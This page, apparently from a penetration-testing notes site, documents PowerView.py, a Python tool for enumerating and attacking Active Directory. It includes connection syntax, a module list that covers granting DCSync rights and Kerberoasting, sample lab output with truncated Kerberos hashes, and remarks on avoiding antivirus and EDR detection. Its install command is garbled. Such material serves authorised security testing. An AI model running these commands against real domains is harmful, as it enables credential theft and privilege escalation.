---
title : "PowerView.py"
# pre : ' '
description : "Just another Powerview alternative."
date : 2023-04-24T14:43:59+02:00
# hidden : true
# draft : true
weight : 1370
tags : ['Other', 'Active Directory', 'LDAP']
---

---

### What is PowerView.py?

PowerView.py is an alternative for the awesome original [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) script. Most of the modules used in PowerView are available in this project ( some of the flags are changed ). There are also some major improvements to the features and functionality since we added ADCS enumeration features and some other great features_(more below)_.

We are not developers, bugs and errors are very likely to happen during execution. Please submit issue if you encounter any issues with the tool.

### Interesting Features

- Embedded user session
- Binding with multiple protocols (ldap, ldaps, gc, gc-ssl), trial and error approach. SSL connection is prioritized.
- Mini Powerview.py console to make you feel like home when using PowerView in Powershell
- Auto-completer, so no more memorizing commands
- Cross-Domain interactions (might or might not work)
_Maybe more?_

### Why not just stick with the ps1 script?

1. Detections
As most of yall know, _PowerView.ps1_ is highly likely to get detected by Defender or AV vendors once downloaded onto the PC. An offensive tool to get detected by AV is a red flag during engagement. Maybe some of you thinking, why not just bypass AMSI and import the script undetected? Well, some of the big companies normally have EDR installed on most endpoints and EDRs are normally hook AMSI patching and also most likely would get detected during AMSI patching. So, PowerView.py FTW!

2. Proxy with ease
Running LDAP query tools through proxies (i.e. SOCKS) is quite overwhelming since it requires a lot of stuffs needed to be installed (i.e. Proxyfier). I dont think windows can support proxychains just yet (at least not on top of my head). Since powerview.py is just a python tool, wrapping it with proxychains is definitely possible. Used it most of the time and it worked like a charm!

## Installation

```plain
git clone https://github.com/aniqfakhrul/powerview.py.git
python3 -m install -r requirements.txt
```

## Usage

```plain
python3 powerview.py [-h] [-d] [-q QUERY] [-ns NAMESERVER] [-v] [--use-ldap | --use-ldaps | --use-gc | --use-gc-ldaps] [-H LMHASH:NTHASH] [-k] [--no-pass] [--aes-key hex key] [--dc-ip IP address] target
```

For example `python3 powerview.py offsec.nl/lowpriv:Welkom1234@10.10.10.10 [--dc-ip 192.168.86.192] [-k]`

## Flags

```plain
positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -d, --debug           Enable debug output
  -q QUERY, --query QUERY
                        PowerView query to be executed one-time
  -ns NAMESERVER, --nameserver NAMESERVER
                        Specify custom nameserver. If not specified, domain controller will be used instead
  -v, --version         show program's version number and exit

protocol:
  --use-ldap            [Optional] Use LDAP instead of LDAPS
  --use-ldaps           [Optional] Use LDAPS instead of LDAP
  --use-gc              [Optional] Use GlobalCatalog (GC) protocol
  --use-gc-ldaps        [Optional] Use GlobalCatalog (GC) protocol for LDAPS

authentication:
  -H LMHASH:NTHASH, --hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  --no-pass             don't ask for password (useful for -k)
  --aes-key hex key     AES key to use for Kerberos Authentication '(128 or 256 bits)'
  --dc-ip IP address    IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter
```

## Modules

| Module                   | Alias                   | Description                                                                             |
| ------------------------ | ----------------------- | --------------------------------------------------------------------------------------- |
| Get-Domain               | Get-NetDomain           | Query for domain information                                                            |
| Get-DomainController     | Get-NetDomainController | Query for available domain controllers                                                  |
| Get-DomainDNSZone        |                         | Query for available DNS zones in the domain                                             |
| Get-DomainDNSRecord      |                         | Query for available records. It will recurse all DNS zones if doesn't specify -ZoneName |
| Get-DomainCA             | Get-NetCA               | Query for Certificate Authority(CA)                                                     |
| Get-DomainCATemplate     | Get-NetCATemplate       | Query for available CA templates. Supports filtering for vulnerable template            |
| Get-DomainGPO            | Get-NetGPO              | Query for domain group policy objects                                                   |
| Get-DomainGPOLocalGroup  | Get-GPOLocalGroup       |                                                                                         |
| Get-DomainOU             | Get-NetOU               |                                                                                         |
| Get-DomainTrust          | Get-NetTrust            |                                                                                         |
| Get-DomainUser           | Get-NetUser             |                                                                                         |
| Get-DomainGroup          | Get-NetGroup            |                                                                                         |
| Get-DomainGroupMember    | Get-NetGroupMember      |                                                                                         |
| Get-NamedPipes           |                         |                                                                                         |
| Get-NetSession           |                         |                                                                                         |
| Get-NetShare             |                         |                                                                                         |
| Get-DomainComputer       | Get-NetComputer         |                                                                                         |
| Get-DomainObject         | Get-ADObject            |                                                                                         |
| Get-DomainObjectOwner    | Get-ObjectOwner         |                                                                                         |
| Get-DomainObjectAcl      | Get-ObjectAcl           |                                                                                         |
| Add-DomainObjectAcl      | Add-ObjectAcl           | Supported rights so far are All, DCsync, RBCD, ShadowCred, WriteMembers                 |
| Remove-DomainObjectAcl   | Remove-ObjectAcl        |                                                                                         |
| Add-DomainGroupMember    | Add-GroupMember         |                                                                                         |
| Remove-DomainGroupmember | Remove-GroupMember      |                                                                                         |
| Add-DomainComputer       | Add-ADComputer          |                                                                                         |
| Remove-DomainComputer    | Remove-ADComputer       |                                                                                         |
| Add-DomainUser           | Add-ADUser              |                                                                                         |
| Remove-DomainUser        | Remove-ADUser           |                                                                                         |
| Set-DomainObject         | Set-Object              |                                                                                         |
| Set-DomainUserPassword   |                         |                                                                                         |
| Set-DomainCATemplate     | Set-CATemplate          |                                                                                         |
| Set-DomainDNSRecord      |                         |                                                                                         |
| Set-DomainObjectOwner    | Set-ObjectOwner         |                                                                                         |
| Find-LocalAdminAccess    |                         |                                                                                         |
| Invoke-Kerberoast        |                         |                                                                                         |
| ConvertFrom-SID          |                         |                                                                                         |

## Examples

### Get-DomainUser

```plain
$ python3 powerview.py offsec.nl/crypt0rr@10.10.20.52
[2023-04-24 14:43:19] No credentials supplied, supply password
Password:
[2023-04-24 14:43:21] LDAP Signing NOT Enforced!
(LDAP)-[10.10.20.52]-[OFFSEC\crypt0rr]
PV > Get-DomainUser Administrator
cn                                : Administrator
description                       : Built-in account for administering the computer/domain
distinguishedName                 : CN=Administrator,CN=Users,DC=offsec,DC=nl
memberOf                          : CN=CO-cadaver42-distlist1,OU=Test,OU=OGC,OU=Stage,DC=offsec,DC=nl
                                    CN=IV-gel-admingroup1,OU=ServiceAccounts,OU=HRE,OU=Tier 2,DC=offsec,DC=nl
                                    CN=BU-BET-distlist1,OU=Devices,OU=AZR,OU=Tier 2,DC=offsec,DC=nl
                                    CN=BR-bar-distlist1,OU=Test,OU=AWS,OU=Tier 2,DC=offsec,DC=nl
                                    CN=FR-270-distlist1,OU=Unassociated,OU=People,DC=offsec,DC=nl
                                    CN=RE-blancoalv-distlist1,OU=Groups,OU=ESM,OU=Stage,DC=offsec,DC=nl
                                    CN=NO-b17221925-admingroup1,OU=Devices,OU=GOO,OU=Stage,DC=offsec,DC=nl
                                    CN=LE-sab-admingroup1,OU=Test,OU=FSR,OU=Tier 2,DC=offsec,DC=nl
                                    CN=EL-plecostom-distlist1,OU=Groups,OU=HRE,OU=Tier 1,DC=offsec,DC=nl
                                    CN=Group Policy Creator Owners,CN=Users,DC=offsec,DC=nl
                                    CN=Domain Admins,CN=Users,DC=offsec,DC=nl
                                    CN=Enterprise Admins,CN=Users,DC=offsec,DC=nl
                                    CN=Schema Admins,CN=Users,DC=offsec,DC=nl
                                    CN=Administrators,CN=Builtin,DC=offsec,DC=nl
name                              : Administrator
objectGUID                        : {1b28b7b4-6da8-4d99-92d3-0b27a711e03f}
userAccountControl                : NORMAL_ACCOUNT
                                    DONT_EXPIRE_PASSWORD
badPwdCount                       : 0
badPasswordTime                   : 2022-12-23 13:36:47.533592
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 2023-04-04 16:39:26.836102
pwdLastSet                        : 2022-12-23 11:40:26.956356
primaryGroupID                    : 513
objectSid                         : S-1-5-21-2080529929-1520703650-438613297-500
adminCount                        : 1
sAMAccountName                    : Administrator
sAMAccountType                    : 805306368
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=offsec,DC=nl
```

### Invoke-Kerberoast

```plain
$ python3 powerview.py offsec.nl/crypt0rr@10.10.20.52
[2023-04-24 14:43:19] No credentials supplied, supply password
Password:
(LDAP)-[10.10.20.52]-[OFFSEC\crypt0rr]
PV > Invoke-Kerberoast
sAMAccountName           : EVERETT_WATTS
servicePrincipalName     : ftp/DC02
Hash                     : $krb5tgs$23$*EVERETT_WATTS$OFFSEC.NL$offsec.nl/EVERETT_WATTS*$6d5c509f4e94577a4f31f8b8b81d2eaa$43808
                           90af51c73d309100ac36267b4a70abe361ba09e1e595d69b[...]

sAMAccountName           : SUNG_LAMBERT
servicePrincipalName     : CIFS/AZRWWKS1000004
Hash                     : $krb5tgs$23$*SUNG_LAMBERT$OFFSEC.NL$offsec.nl/SUNG_LAMBERT*$1be94f7ee865f8a4a8d428b19ed451bf$8871c31
                           41d2d03aca798db0bf9e0953e0d29e933d7d89976bc08f9a7275f[...]

sAMAccountName           : KEISHA_WATERS
servicePrincipalName     : https/SECWWKS1000000
Hash                     : $krb5tgs$23$*KEISHA_WATERS$OFFSEC.NL$offsec.nl/KEISHA_WATERS*$7dc2c63ed06a6b3a1c5afe4fc99cfdee$bf271
                           37a31439273c2d8eec49a38f5f78faab30dc6c540add7fc3780c13aa4f57fcd626b64c[...]
```

## URL list

- [Github.com - Powerview.py](https://github.com/aniqfakhrul/powerview.py)
